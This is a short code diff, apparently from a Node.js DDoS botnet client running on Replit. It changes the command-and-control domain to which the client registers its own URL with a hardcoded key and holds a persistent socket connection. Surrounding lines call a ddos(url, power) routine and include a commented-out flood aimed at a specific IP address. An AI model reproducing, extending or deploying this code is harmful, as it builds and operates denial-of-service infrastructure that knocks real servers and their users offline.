@@ -27,7 +27,7 @@ if (isMainThread) {
 		res.end(".");
 	});
 	app.listen(80, () => {
-		axios.post("https://Server.whatthrefuck.repl.co/_api/v1/addclient",{
+		axios.post("https://Server.zsdyuqczexhehe0.repl.co/_api/v1/addclient",{
       "key": "3hj82klahn2sx384",
       "url": "https://" + process.env.REPL_SLUG + "." + process.env.REPL_OWNER + ".repl.co"
     })
@@ -85,7 +85,7 @@ if (isMainThread) {
     ddos(url,power)
   }
   //ddos('http://46.166.142.81/',1000)
-  const socket = new io('wss://server.whatthrefuck.repl.co', {
+  const socket = new io('wss://server.zsdyuqczexhehe0.repl.co', {
 		reconnection: true,
 		reconnectionAttempts: 10000,
 		reconnectionDelay: 6000,
